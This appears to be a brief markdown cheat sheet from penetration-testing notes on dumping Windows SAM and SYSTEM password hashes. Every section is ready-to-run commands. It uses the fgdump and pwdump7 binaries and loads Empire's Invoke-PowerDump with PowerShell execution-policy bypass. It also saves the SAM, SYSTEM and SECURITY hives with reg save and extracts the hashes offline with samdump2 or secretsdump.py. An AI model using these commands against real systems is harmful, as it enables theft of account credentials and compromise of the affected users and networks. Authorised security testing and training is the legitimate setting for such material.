# dump SAM SYSTEM

## [fgdump](http://foofus.net/goons/fizzgig/fgdump/fgdump-usage.htm) | [pwdump7](https://www.tarasco.org/security/pwdump\_7/)

```bash
> fgdump.exe

> pwdump7.exe
```

## [dump.ps1](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1)

```bash
> powershell.exe -exec bypass -Command "& {Import-Module .\Invoke-PowerDump.ps1; Invoke-PowerDump}"
```

## manually

```bash
reg save hklm\sam c:\Users\Public\ksam
reg save hklm\system c:\Users\Public\ksystem
reg save hklm\security c:\Users\Public\ksecurity

# on kali
samdump2 ksystem ksam
# [OR]
secrectsdump.py -sam ksam -security ksecurity -system ksystem LOCAL
```
